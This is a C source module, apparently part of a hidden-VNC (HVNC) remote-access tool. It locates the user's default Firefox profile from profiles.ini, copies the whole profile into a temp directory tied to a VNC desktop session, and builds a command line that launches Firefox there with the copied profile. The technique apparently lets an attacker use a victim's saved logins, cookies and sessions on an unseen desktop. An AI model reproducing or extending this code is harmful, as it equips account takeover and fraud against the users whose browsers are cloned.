//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: ff.c
// $Revision: 194 $
// $Date: 2014-07-11 16:55:06 +0400 (Пт, 11 июл 2014) $
// description: 
//	FireFox launch in VNC session support
//	The idea is to duplicate default user profile and launch ff with temporary profile

#include "project.h"
#include <malloc.h>
#include "rt\file.h"
#include "exec.h"
#include "copy.h"
#include "rt\str.h"
#include "browser.h"

#define FF_PREFIXW L"FF"
#define FF_PREFIXA "FF"
#ifdef UNICODE
	#define FF_PREFIX FF_PREFIXW
#else
	#define FF_PREFIX FF_PREFIXA
#endif

#define FF_START_PROFILE_A  " --no-remote -profile "
#define FF_DATA_DIR_A       "Mozilla\\Firefox"
#define FF_PROFILES_INI_A   "profiles.ini"

#define FF_START_PROFILE_W  L" --no-remote -profile "
#define FF_DATA_DIR_W       L"Mozilla\\Firefox"
#define FF_PROFILES_INI_W   L"profiles.ini"

#define FF_PROFILE_DEF_A    "Profiles\\Default"
#define FF_PROFILE_DEF_W    L"Profiles\\Default"

#define FF_PROFILES_A    "Profiles"
#define FF_PROFILES_W    L"Profiles"

//////////////////////////////////////////////////////////////////////////
// reads FF default profile path from profiles.ini
LPWSTR FF_FindDefaultProfileW(LPCWSTR szPath)
{
	LPWSTR szFileName;
	ULONG FileNamLen;
	LPWSTR szProfile = NULL;
	DWORD szProfileLength = 0,Length = 0;
	WIN32_FIND_DATAW FindData = {0}; 

	HANDLE hFind;

	FileNamLen = (lstrlenW(szPath)+sizeof(L"\\") + sizeof(FF_PROFILES_A)+sizeof("\\*") + 1)*sizeof(WCHAR);
	szFileName = hAlloc(FileNamLen);
	if ( szFileName ){
		lstrcpyW(szFileName,szPath);
		lstrcatW(szFileName,L"\\" FF_PROFILES_W L"\\*");
		memset(&FindData, 0, sizeof(WIN32_FIND_DATAW));

		// Searching for files within the current directory first
		if ((hFind = FindFirstFileW(szFileName, &FindData)) != INVALID_HANDLE_VALUE)
		{
			do
			{
				// Skipping large files
				if ( ( FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ) != FILE_ATTRIBUTE_DIRECTORY )
					continue;

				if (FindData.cFileName[0] == '.')
					continue;

				// construct standard profile name
				szProfileLength = (lstrlenW( FindData.cFileName)+sizeof(FF_PROFILES_A)+sizeof("\\") + 1)*sizeof(WCHAR);
				szProfile = hAlloc(szProfileLength);
				if ( szProfile ){
					lstrcpyW(szProfile,FF_PROFILES_W L"\\");
					lstrcatW(szProfile,FindData.cFileName);
				}else{
					SetLastError(ERROR_NOT_ENOUGH_MEMORY);
				}
			} while(FindNextFileW(hFind, &FindData));
			FindClose(hFind);
		}
	}else{
		SetLastError(ERROR_NOT_ENOUGH_MEMORY);
	}
	return szProfile;
}

// szPath path to FF profile dir %APPDATA%\\Mozilla\\FireFox
LPWSTR FF_GetDefaultProfileW(LPCWSTR szPath,PBOOL bRelative)
{
	LPWSTR szFileName = NULL;
	ULONG FileNamLen;
	HANDLE hFile;
	BOOL fbLastProfileWasRelative = FALSE;
	LPWSTR szProfile = NULL;
	DWORD szProfileLength = 0,Length = 0;

	WCHAR szLine[MAX_PATH];
	BOOL fbDefaultProfile = FALSE;
	BOOL fbNameFound  = FALSE;
	BOOL fbRelative  = FALSE;
	DWORD LineLen;

	*bRelative = FALSE;

	// set default error
	SetLastError(ERROR_FILE_NOT_FOUND);

	do{

		FileNamLen = (lstrlenW(szPath) + sizeof(FF_PROFILES_INI_A)+sizeof("\\") + 1)*sizeof(WCHAR);
		szFileName = hAlloc(FileNamLen);
		if ( szFileName == NULL ){
			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
			break;
		}

		lstrcpyW(szFileName,szPath);
		lstrcatW(szFileName,L"\\" FF_PROFILES_INI_W);

		hFile = 
			CreateFileW(
				szFileName,
				GENERIC_READ,
				FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
				NULL,OPEN_EXISTING,
				FILE_ATTRIBUTE_NORMAL,
				NULL
				);
		if ( hFile == INVALID_HANDLE_VALUE ){
			// search in profiles dir
			szProfile = FF_FindDefaultProfileW( szPath );
			if ( szProfile == NULL )
			{
				// construct standard profile name
				szProfile = hAlloc(sizeof(FF_PROFILE_DEF_W));
				if ( szProfile ){
					lstrcpyW(szProfile,FF_PROFILE_DEF_W);
					fbLastProfileWasRelative = TRUE;
				}else{
					SetLastError(ERROR_NOT_ENOUGH_MEMORY);
				}
			}else{
				fbLastProfileWasRelative = TRUE;
			}
			break;
		}

		// scan lines and find default profile
		while ( LineLen = FileReadStringW(hFile,szLine,MAX_PATH ) )
		{
			if ( _wcsnicmp(szLine,L"[Profile",sizeof("[Profile")-1 ) == 0 )
			{
				if ( fbNameFound ){
					fbLastProfileWasRelative = fbRelative;
				}
				fbRelative = FALSE;
				fbDefaultProfile = FALSE;
				fbNameFound = FALSE;
			} 
			else if ( _wcsnicmp(szLine,L"Path=",sizeof("Path=")-1 ) == 0 )
			{
				Length = (LineLen - (sizeof("Path=")-1) + 1)*sizeof(WCHAR);
				if ( szProfile ){
					if ( Length > szProfileLength ){
						szProfile = hRealloc(szProfile,Length);
						szProfileLength = Length;
					}
				}else{
					szProfile = hAlloc(Length);
					szProfileLength = Length;
				}
				
				if ( szProfile ){
					memcpy(szProfile,szLine+sizeof("Path=")-1,Length-1);
					szProfile[(Length-1)/sizeof(WCHAR)] = L'\0';
					fbNameFound = TRUE;
					fbLastProfileWasRelative = fbRelative;
					if ( fbDefaultProfile ){
						break;
					}
				}else{
					SetLastError(ERROR_NOT_ENOUGH_MEMORY);
					break;
				}
			}
			else 
				if ( lstrcmpW(szLine,L"Default=1" ) == 0 )
			{
				fbDefaultProfile = TRUE;
				if ( fbNameFound ){
					break;
				}
			}
			else if ( lstrcmpW(szLine,L"IsRelative=1" ) == 0 )
			{
				fbRelative = TRUE;
				if ( fbNameFound ){
					fbLastProfileWasRelative = fbRelative;
				}
			}
		}
		CloseHandle(hFile);

	}while( FALSE );

	if ( szFileName ){
		hFree( szFileName );
	}
	*bRelative = fbLastProfileWasRelative;
	return szProfile;
}

BOOL FF_CreateEvent(PVNC_SESSION pSession)
{
	return (BR_CreateEvent(pSession,FF_PREFIX)!=NULL);
}

BOOL FF_IsStarted(PVNC_SESSION pSession)
{
	return BR_IsStarted(pSession,FF_PREFIXA);
}
//////////////////////////////////////////////////////////////////////////
// returns cmdline arguments for new firefox instance
WINERROR FF_GetCommandLineW(PVNC_SESSION pSession, LPCWSTR szPath,LPWSTR *pNewCommandLine)
{
	WINERROR Error = NO_ERROR;

	LPWSTR szHvncProfile = NULL;
	LPWSTR szSrcProfile = NULL;
	LPWSTR szDefProfile = NULL;
	LPWSTR NewCommandLine = NULL;
	int NewCommandLineLength;

	BOOL fbRelative = FALSE;
	BOOL fbNeedToCopy;
	PVOID StatusCtx = NULL;
	HANDLE hCS = NULL;
	USES_CONVERSION;

	do{
		// build vnc profile for our browser
		// (located into the temp directory)
		// %TEMP%\{DESKTOP_GUID}_BROWSER_PREFIX
		szHvncProfile = BR_GetTempProfileName(pSession,FF_PREFIXW);
		if ( szHvncProfile == NULL ){
			Error = GetLastError();
			DbgPrint("BR_BuildTempPath failed, Error=%x\n",Error);
			break;
		}

		// enter to critical section for browsers
		hCS = BR_EnterCriticalSection(pSession);
		if ( hCS == NULL ){
			// failed to start browser
			Error = ERROR_TIMEOUT;
			DbgPrint("BR_EnterCriticalSection failed, szPath=%S\n",szPath);
			break;
		}

		// check if we need to copy profile
		// create named event to identify the running FF copy
		fbNeedToCopy = !FF_IsStarted(pSession);

		// src profile
		if ( fbNeedToCopy ){

			PWSTR  szTemp;

			// now we should construct source profile path by expanding 
			// %APPDATA%\Mozilla\Firefox to
			// C:\Users\USER\AppData\Local\Mozilla\Firefox
			szSrcProfile = 
				BR_GetProfileNameW(
					pSession,
					APP_DATA_VAR_W,
					FF_DATA_DIR_W
					);
			if ( szSrcProfile == NULL ){
				Error = GetLastError();
				DbgPrint("BR_GetProfileNameW failed, Error=%x\n",Error);
				break;
			}
			// get default profile name from profiles.ini
			szDefProfile = FF_GetDefaultProfileW(szSrcProfile,&fbRelative);
			if ( szDefProfile == NULL ){
				Error = GetLastError();
				DbgPrint("FF_GetDefaultProfileW failed, Error=%x\n",Error);
				break;
			}

			// fix backslashes
			FileFixSlashW(szDefProfile);
			if ( fbRelative ){
				LPWSTR szSrcProfileFull = NULL;
				DWORD SrcProfileFullLength;

				SrcProfileFullLength = lstrlenW(szSrcProfile)+lstrlenW(szDefProfile)+1+1; // \\+/0
				szSrcProfileFull = hAlloc(SrcProfileFullLength*sizeof(WCHAR));
				if ( szSrcProfileFull == NULL ){
					Error = GetLastError();
					DbgPrint("hAlloc(%u) failed, Error=%x\n",SrcProfileFullLength*sizeof(WCHAR),Error);
					break;
				}
				lstrcpyW(szSrcProfileFull,szSrcProfile);
				lstrcatW(szSrcProfileFull,L"\\");
				lstrcatW(szSrcProfileFull,szDefProfile);
				szTemp = szSrcProfile;
				szSrcProfile = szSrcProfileFull;
				hFree ( szTemp );
			}
			else
			{
				szTemp = szSrcProfile;
				szSrcProfile = szDefProfile;
				hFree ( szTemp );
				szDefProfile = NULL;
			}

			// show status window
			StatusCtx = XStatusStartThread(pSession);

			// copy browser data
			Error = 
				XCopyDirectorySpecifyProcessW(
					wczFirefox,
					szSrcProfile,
					szHvncProfile
					);

			// remove status window
			XStatusStopThread(StatusCtx);

		}else{
			Error = NO_ERROR;
		}

		// here we are
		// now we need to construct browser command-line
		// 
		// --no-remote -profile "%HVNCPROFILE%"
		NewCommandLineLength = 
			sizeof(FF_START_PROFILE_A) + 
			lstrlenW(szHvncProfile) + 1;
		NewCommandLine = hAlloc(NewCommandLineLength*sizeof(WCHAR));
		if ( NewCommandLine == NULL ){
			Error = ERROR_NOT_ENOUGH_MEMORY;
			DbgPrint("hAlloc failed, Error=%x\n",Error);
			break;
		}
		lstrcpyW(NewCommandLine,FF_START_PROFILE_W);
		lstrcatW(NewCommandLine,szHvncProfile);

	} while ( FALSE );

	// leave critical section
	BR_LeaveCriticalSection(pSession,hCS );


	if ( szDefProfile ){
		hFree( szDefProfile );
	}
	if ( szHvncProfile ){
		hFree( szHvncProfile );
	}
	if ( szSrcProfile ){
		hFree( szSrcProfile );
	}

	if ( Error != NO_ERROR ){
		if ( NewCommandLine ){
			hFree( NewCommandLine );
		}
	}else{
		*pNewCommandLine = NewCommandLine;
	}

	return Error;
}

WINERROR FF_GetCommandLineA(PVNC_SESSION pSession, LPCSTR szPath,LPSTR *pNewCommandLine)
{
	return BR_GetCommandLineA(pSession,szPath,pNewCommandLine,FF_GetCommandLineW);
}

//////////////////////////////////////////////////////////////////////////

